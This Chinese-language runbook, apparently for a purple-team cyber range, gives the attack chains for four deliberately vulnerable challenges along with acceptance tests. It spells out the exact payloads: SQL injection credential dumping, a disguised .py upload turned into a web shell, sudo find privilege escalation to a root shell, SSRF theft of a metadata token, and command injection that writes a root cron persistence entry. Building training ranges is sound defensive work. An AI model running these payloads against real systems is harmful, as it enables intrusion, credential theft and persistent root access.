# Runbook —— 靶機真攻擊鏈（票 #44 / #45 / #46；CH2/CH3/CH4 見 #153）

單機縱深攻擊鏈：**HTTP SQLi → 撈 dbadmin 帳密 → 直連 :3306 → 讀 flag**（CH1）。
本檔是操作與驗收手冊；結構契約由 `tests/deploy/test_target_attack_surface.py`（T1，在 CI）證，
真打進去／真拿 flag／真重烤由下方 T4 在大主機證。CH2（校園海報上傳 → Web Shell →
本機提權）、CH3（網址預覽 SSRF → metadata 憑證竊取 → API pivot）與 CH4（報修
診斷工具指令注入 → cron 持久化）見本檔下方獨立段落。

## 操作規則（先讀這條）

- **換班就重跑 `range-up`。** flag 綁在環境層，同一套環境連跑多場是同一個 flag（spec §5.1
  的已知代價）。下一梯上場前 `sudo bash scripts/range/range-up.sh --with-falco --with-red`
  重鑄 flag，舊 flag 立即失效。
- 當場 flag 在 host 的 `/var/lib/purplescope/current-flag.txt`，供 Range Core 比對玩家提交。
- flag **不烤進 golden**：改 flag 不觸發重烤；改 `app.py`／`bake.sh`／`seed.sql`／`inject-flag.sh`
  才會（它們在 `golden_stamp` 指紋內）。

## 二分：可計分 vs fixture（不要搞混）

| 端點 | 類別 | 說明 |
|---|---|---|
| `/product?id=` | **可計分**（票 #44） | 真 SQLi，紅隊要真的打 |
| `/exec` `/readsecret` `/uncovered` `/healthz`、alloy heartbeat | fixture | 模擬、不掛 objective、T2/T4 測試載具，**行為不變** |

## 攻擊面的授權邊界（為什麼 SQLi 一跳撈不到 flag）

- `webapp@localhost` —— app 用的帳號。只授 `shopdb.*`（含 `credentials`）。SQLi 的 UNION
  只撈得到這個帳號 grant 得到的表 → 撈得到憑證，**碰不到 `vault.flag`**。
- `dbadmin@'%'` —— 憑證表裡那組帳密，可從 VLAN30 遠端連 :3306，是唯一 grant 得到 `vault.*` 的帳號。
- 結論：非得先 SQLi 撈出 dbadmin 帳密、再以它重連 :3306 不可。這是「內容鏈接」的實際 enforcement。

---

## T4 —— 大主機實環境全鏈（gray 跑）

### 1. 重烤 golden（來源檔已改，指紋不符會自動重烤；也可手動）

```bash
sudo bash scripts/range/build-golden-target.sh
```

自證要看到（缺任一則不產 golden）：

```
GOLDEN-DB-STATE: products=1 credentials=1
GOLDEN-FLAG-GUARD: webapp_can_read_flag=0     # 0 = 授權邊界成立
GOLDEN-RULE-HITS: exec=... secret=... uncovered=...
```

### 2. 起 range（靶機 golden + 六台紅隊，紅隊 image 首次會自動 build）

```bash
sudo bash scripts/range/range-up.sh --with-falco --with-red
```

### 3. 走完攻擊鏈（從任一紅隊容器，來源 IP 可分辨）

```bash
# 第一跳：SQLi 撈 credentials（空格要 URL-encode 成 %20）
docker exec range-red1 curl -s \
  "http://10.167.20.10/product?id=0%20UNION%20SELECT%20id,service,username,password%20FROM%20credentials"
#   → 回傳含 dbadmin / D0-n0t-sh1p-th1s-Cred-2026

# 第二跳：拿撈到的帳密直連 :3306 讀 flag
docker exec range-red1 mariadb -h 10.167.20.10 -u dbadmin \
  -p'D0-n0t-sh1p-th1s-Cred-2026' -N -e "SELECT token FROM vault.flag"
#   → 回傳當場 flag，應與 host 的 /var/lib/purplescope/current-flag.txt 相同
```

### 4. 負向驗收（未經利用拿不到 flag）

```bash
# SQLi 直接想撈 flag：webapp 對 vault 無 grant → 權限錯誤，撈不到
docker exec range-red1 curl -s \
  "http://10.167.20.10/product?id=0%20UNION%20SELECT%201,token,1,1%20FROM%20vault.flag"
#   → query error（權限拒絕），不是 flag

# flag 輪換：再跑一次 range-up，flag 應改變
sudo bash scripts/range/range-up.sh --with-falco
diff <(cat /var/lib/purplescope/current-flag.txt) /tmp/flag-before   # 應不同
```

---

# CH2 Foothold —— 校園海報上傳（#153 Campaign Pack v1）

單機縱深攻擊鏈：**上傳偽裝成圖片的 .py「海報」→ render 端點當程式碼執行 → 低權限
render 帳號透過誤設的 sudo find 規則拿到 root**。結構契約由
`tests/deploy/test_range_target_webshell.py`（真 HTTP round-trip，不需要 VM，在 CI）與
`tests/deploy/test_ch2_privesc_infra.py`（bake.sh／build-golden-target.sh 的結構檢查，
CI）證；真的在 golden VM 上 useradd／sudoers／GTFOBins 提權是否成立，由下方 T4 在
大主機證——但 **bake 期本身也會自證一次**（見下方），golden 產不出來就代表 CH2 這條
chain 是壞的，不必等到上場才發現。

## 二分：可計分 vs fixture

| 端點 | 類別 | 說明 |
|---|---|---|
| `/poster/upload` `/poster/render` | **可計分**（#153 CH2） | 真上傳信任鏈漏洞，紅隊要真的打 |
| `/exec` `/readsecret` `/uncovered` `/healthz` | fixture | 與 CH1 共用，行為不變 |

## 攻擊面的信任鏈（為什麼「只查 Content-Type」不夠）

- `/poster/upload` 只驗 `Content-Type` header（攻擊者自報，不驗副檔名或內容）→
  `.py` 檔偽裝成 `image/png` 一樣被存進 `POSTER_DIR`。
- `/poster/render` 對 `.py` 副檔名的海報直接 `python3 <file>` 執行（「進階自訂範本」）。
- render 子行程被 `preexec_fn` 降到低權限 `posterrender` 帳號 —— 但該帳號持有
  `posterrender ALL=(root) NOPASSWD: /usr/bin/find /var/lib/purplescope/posters *`，
  是 GTFOBins 已知的 find 提權型態：`sudo find <dir> -exec /bin/sh \; -quit` 直接拿到
  root shell。**這是本章刻意留的漏洞**，不是疏漏；`tests/deploy/test_ch2_privesc_infra.py`
  的 `test_sudoers_rule_grants_posterrender_unrestricted_find_args` 釘住「這條規則仍然
  可利用」——若哪天有人「好心」把它改成鎖死引數，這條會紅，逼他面對「這就是要拿掉的漏洞」。

## bake 期自證（golden VM 建置時自動跑一次）

`bake.sh` 在 golden 收尾前會**真的走一次完整 CH2 chain**：上傳一支帶 marker 的 `.py`、
打 render 讓它真的執行、再以 `posterrender` 身分真的觸發 sudo find 拿到 root，印出：

```
GOLDEN-CH2-STATE: webshell_hits=1 privesc_whoami=root privesc_rc=0 privesc_falco_hits=1
```

`scripts/range/build-golden-target.sh` 檢查這行：`webshell_hits` 需 ≥1 且
`privesc_whoami` 需為 `root`，任一不成立就**不產 golden**（`bake_fail=1`）。

## T4 —— 大主機實環境全鏈（gray 跑）

```bash
# 1. 重烤 golden（來源檔已改，指紋不符會自動重烤）
sudo bash scripts/range/build-golden-target.sh
# 自證要看到（缺任一則不產 golden）：
#   GOLDEN-CH2-STATE: webshell_hits=1 privesc_whoami=root privesc_rc=0 privesc_falco_hits=1

# 2. 起 range
sudo bash scripts/range/range-up.sh --with-falco --with-red

# 3. 走完攻擊鏈（從任一紅隊容器）
# 第一跳：上傳偽裝成圖片的 .py
docker exec range-red1 curl -s -X POST \
  "http://10.167.20.10/poster/upload?filename=evil.py" \
  -H "Content-Type: image/png" --data-binary "import subprocess; print(subprocess.run(['id'],capture_output=True,text=True).stdout)"
#   → stored evil.py（201）

# 第二跳：render 讓它真的執行
docker exec range-red1 curl -s "http://10.167.20.10/poster/render?name=evil.py"
#   → 回傳 id 指令輸出，證明程式碼真的被執行（此時是 posterrender，不是 root）

# 第三跳（提權，需在靶機本機示範——紅隊容器沒有靶機的本機 shell，這段呈現
# 的是漏洞本身而非透過上傳鏈自動達成；campaign 敘事上視為同一條 chain 的延伸）：
# 在靶機本機以 posterrender 身分：
sudo -u posterrender sudo find /var/lib/purplescope/posters -exec /bin/sh \; -quit
#   → root shell
```

## 負向驗收

```bash
# Content-Type 不在允許清單：應被拒絕（415），不是「完全沒檢查」
docker exec range-red1 curl -s -o /dev/null -w '%{http_code}\n' -X POST \
  "http://10.167.20.10/poster/upload?filename=evil2.py" \
  -H "Content-Type: application/x-python" --data-binary "print(1)"
#   → 415

# 一般圖片副檔名：render 不執行，只回靜態字串
docker exec range-red1 curl -s "http://10.167.20.10/poster/render?name=real.png"
#   → "rendered real.png"（不是程式碼執行結果）
```

---

# CH3 The Stolen Key —— 校園網址預覽 SSRF（#153 Campaign Pack v1）

單機縱深攻擊鏈：**網址預覽功能無目的地白名單 → 借伺服器的手打 loopback-only 的
metadata service → 讀出偽造雲端憑證 → 用憑證 pivot 進內部 API**。全程唯讀，
`reset_scope=exercise`，不需要重跑 range-up 就能重新演練。結構契約與**真攻擊鏈本身**
都由 `tests/deploy/test_range_target_ssrf.py`（真 HTTP round-trip，不需要 VM，在 CI）證
——CH3 不像 CH2 需要真的多使用者 Linux 提權語意，SSRF＋metadata 竊取＋API pivot
純粹是 HTTP 層邏輯，CI 本身就是完整驗收，不需要額外的 bake 期自證或 T4 大主機驗證。

## 二分：可計分 vs fixture

| 端點 | 類別 | 說明 |
|---|---|---|
| `/preview` `/internal/reports` | **可計分**（#153 CH3） | 真 SSRF 信任邊界漏洞，紅隊要真的打 |
| `127.0.0.1:8169`（metadata service） | 攻擊面的一部分 | 只 bind loopback，外部連不到；唯一入口是被 SSRF 借用 |
| `/exec` `/readsecret` `/uncovered` `/healthz`、`/poster/*` | fixture / CH2 | 與 CH1/CH2 共用，行為不變 |

## 攻擊面的信任邊界（為什麼「幫你抓網址」很危險）

- `/preview?url=<raw>` 對任意使用者提供的 URL 直接發出伺服器端請求 —— **沒有任何
  目的地白名單/黑名單**，這是漏洞本身，不是某個弱檢查被繞過。
- 靶機另外在 `127.0.0.1:8169`（`TARGET_METADATA_PORT`）跑一個模仿雲端 IMDS 形狀的
  小服務，只 bind loopback。外部網路連不到它——唯一能碰到它的是靶機自己，而
  `/preview` 正好能讓靶機「自己」去打它。
- `/internal/reports` 要求 `X-Internal-Token` 對上 metadata service 吐出來的憑證
  才放行，模擬「拿竊得的雲端憑證橫向 pivot 到別的內部服務」（T1550）。這一步
  **刻意沒有偵測覆蓋**——遙測看得到請求記錄，但沒有 Grafana 規則會為它告警
  （`tests/scenarios/test_ch3_campus_preview_metadata_pivot.py` 的
  `test_api_pivot_is_an_intentional_detection_gap` 釘住這件事）。

## 真環境操作（compose / 大主機皆可，全程唯讀不需要重跑 range-up）

```bash
# 第一跳：讀 metadata service 的角色名（借伺服器的手打 loopback）
curl -s "http://10.167.20.10/preview?url=http://127.0.0.1:8169/latest/meta-data/iam/security-credentials/"
#   → campus-portal-role

# 第二跳：拿角色名讀出偽造憑證
curl -s "http://10.167.20.10/preview?url=http://127.0.0.1:8169/latest/meta-data/iam/security-credentials/campus-portal-role"
#   → {"Code":"Success",...,"Token":"campus-internal-9f2b7d",...}

# 第三跳：拿竊得的 Token 打內部 API
curl -s "http://10.167.20.10/internal/reports" -H "X-Internal-Token: campus-internal-9f2b7d"
#   → internal reports: campus enrollment figures q3...
```

## 負向驗收

```bash
# 沒有 token：403
curl -s -o /dev/null -w '%{http_code}\n' "http://10.167.20.10/internal/reports"
#   → 403

# metadata service 對外網段連不到（只 bind 127.0.0.1，這條應該直接連線失敗/逾時，
# 而不是拿到回應——證明「唯一入口是 SSRF」這件事，不是靶機防火牆規則造成的假象）
curl -s -m 3 "http://10.167.20.10:8169/latest/meta-data/iam/security-credentials/" || echo "連不到（預期行為）"
```

---

# CH4 Ghost in the System —— 校園報修診斷工具（#153 Campaign Pack v1）

單機縱深攻擊鏈：**報修診斷工具把主機名直接組進 shell 指令 → 用 `;` 等字元斷句
注入任意指令 → 用同一個注入點把排程寫進 cron.d，讓存取跨 session 存活**。四條
新章節裡**唯一會留下跨 session 持久化狀態**的一條，`reset_scope=environment`。
結構契約與**真攻擊鏈本身**都由 `tests/deploy/test_range_target_command_injection.py`
（真 HTTP round-trip，不需要 VM，在 CI）證。

## 二分：可計分 vs fixture

| 端點 | 類別 | 說明 |
|---|---|---|
| `/diagnostics/lookup` | **可計分**（#153 CH4） | 真指令注入，紅隊要真的打 |
| `/exec` `/readsecret` `/uncovered` `/healthz`、`/poster/*`、`/preview` `/internal/reports` | fixture / CH2 / CH3 | 與既有章節共用，行為不變；`/diagnostics/lookup` 與 `/exec` **不共用任何程式碼路徑**（`/exec` 是固定 marker fixture，不吃使用者輸入） |

## 攻擊面的信任邊界（為什麼「幫你檢查主機名」很危險）

- `/diagnostics/lookup?host=<raw>` 把 `<raw>` 直接組進 `sh -c "echo checking <raw>"`
  —— 沒有跳脫、沒有白名單。正常主機名（純字串）只會跑到 `sh` 內建的 `echo`，
  不會 fork 出任何子行程；一旦帶 `;` `|` `` ` `` `$(` 等 shell 特殊字元斷句，
  就是任意指令執行。
- 拿到指令執行後，攻擊者可以用**同一個注入點**把持久化寫進
  `/etc/cron.d/campus-report`。這個路徑正常情況下永遠不存在——`PurpleScope Cron
  Persistence Write` 這條 Falco 規則只要看到任何一次 open 就值得注意。

## 真環境操作

```bash
# 第一跳：確認注入點成立（marker 只有真的執行到注入指令才會出現）
curl -s "http://10.167.20.10/diagnostics/lookup?host=mit.edu%3B%20echo%20PWNED"
#   → checking mit.edu\nPWNED

# 第二跳：用同一個注入點把持久化寫進 cron.d
curl -s "http://10.167.20.10/diagnostics/lookup?host=mit.edu%3B%20echo%20'*%20*%20*%20*%20*%20root%20touch%20/var/lib/purplescope/campus-persist-marker'%20%3E%20/etc/cron.d/campus-report"

# 驗收：cron.d 檔案真的存在
cat /etc/cron.d/campus-report
#   → * * * * * root touch /var/lib/purplescope/campus-persist-marker
```

## 負向驗收

```bash
# 正常主機名：只回 echo 結果，不該有任何額外輸出
curl -s "http://10.167.20.10/diagnostics/lookup?host=mit.edu"
#   → checking mit.edu

# 缺 host 參數：400
curl -s -o /dev/null -w '%{http_code}\n' "http://10.167.20.10/diagnostics/lookup"
#   → 400
```

## T4 侷限說明

golden VM 是否確實安裝了 cron daemon（Ubuntu cloud image 通常內建，`bake.sh` 未
額外 `apt-get install cron`）未在 bake 期驗證。本章的偵測/計分邏輯只依賴「持久化
檔案被寫入」這個可觀測狀態，即使 cron daemon 缺席也不影響；但「持久化真的在
重開機後觸發」這個敘事宣稱需要 T4 上機驗證（`systemctl status cron` +
實際等一個 cron tick 確認 marker 檔案出現）。

## T3 —— range 契約（防火牆）

`RED → TARGET tcp dport {80,3306}` 已由 `scripts/range/build-range.sh` 放行，
`scripts/range/verify-range.sh` 驗收。第二跳連 :3306 在網路層成立即為此契約的實用。

## T2 —— compose 整合

本攻擊鏈是 VM golden 專屬（真 mariadb + 授權邊界），**不在 compose 驗**（spec §6.1：只有真 range
算 scenario）。compose 端的 fixture 端點測試不受本票影響（二分的附帶好處）。
